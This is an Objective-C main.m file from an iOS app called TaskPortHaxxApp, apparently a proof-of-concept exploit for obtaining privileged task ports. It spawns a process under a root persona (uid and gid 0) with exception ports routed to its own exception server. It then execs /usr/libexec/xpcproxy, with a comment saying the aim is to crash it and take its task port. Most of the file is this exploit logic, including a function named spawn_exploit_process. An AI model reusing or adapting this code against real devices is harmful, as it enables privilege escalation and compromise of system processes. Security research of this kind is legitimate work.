//
//  main.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#import "Header.h"

// __atomic_load_8, __atomic_store_8

int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t *__restrict attr, mach_port_t portarray[], uint32_t count);

int child_execve(void) {
    mach_port_t exception_port = MACH_PORT_NULL;
    bootstrap_look_up(bootstrap_port, "com.kdt.taskporthaxx.exception_server", &exception_port);
    assert(exception_port != MACH_PORT_NULL);
    
    posix_spawnattr_t attr;
    if(posix_spawnattr_init(&attr) != 0) {
        perror("posix_spawnattr_init");
        return 1;
    }
    
    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
        perror("posix_spawnattr_set_flags");
        return 1;
    }
    
    // Purposefully crash it to get its task port
//    mach_port_t parent_task_port = MACH_PORT_NULL;
//    task_for_pid(mach_task_self(), getppid(), &parent_task_port);
//    assert(parent_task_port != MACH_PORT_NULL);
//    posix_spawnattr_set_ptrauth_task_port_np(&attr, parent_task_port);
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){0, bootstrap_port, exception_port}, 3);
    char *argv2[] = { "/usr/libexec/xpcproxy", NULL };
    posix_spawn(NULL, argv2[0], NULL, &attr, argv2, environ);
    perror("posix_spawn");
    return 1;
}

pid_t spawn_sleep_process(void) {
    pid_t pid;
    char *argv[] = {**_NSGetArgv(), "sleep", NULL};
    int ret = posix_spawn(&pid, argv[0], NULL, NULL, argv, environ);
    if (ret) {
        perror("posix_spawn");
        return 0;
    }
    printf("Spawned sleep process with PID %d\n", pid);
    return pid;
}

pid_t spawn_exploit_process(mach_port_t exception_port) {

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
    posix_spawnattr_set_persona_uid_np(&attr, 0);
    posix_spawnattr_set_persona_gid_np(&attr, 0);
    posix_spawnattr_setexceptionports_np(&attr,
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port, EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    //posix_spawnattr_set_ptrauth_task_port_np(&attr, mach_task_self());
    char *argv[] = {**_NSGetArgv(), "child", NULL};
    int ret = posix_spawn(&pid, argv[0], NULL, &attr, argv, environ);
    if (ret) {
        perror("posix_spawn");
        return 0;
    }
    printf("Spawned exploit process with PID %d\n", pid);
    return pid;
}

int main(int argc, char * argv[]) {
    if(argc >= 2) {
        if (strcmp(argv[1], "child") == 0) {
            return child_execve();
//        } else if (strcmp(argv[1], "signal") == 0) {
//            assert(argc >= 3);
//            pid_t target_pid = (pid_t)atoi(argv[2]);
//            kill(target_pid, SIGTRAP);
//            return 0;
        } else if (strcmp(argv[1], "test") == 0) {
            mach_port_t exc = setup_exception_server();
            spawn_exploit_process(exc);
            CFRunLoopRun();
        } else if (strcmp(argv[1], "sleep") == 0) {
            CFRunLoopRun();
        }
    }
    
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
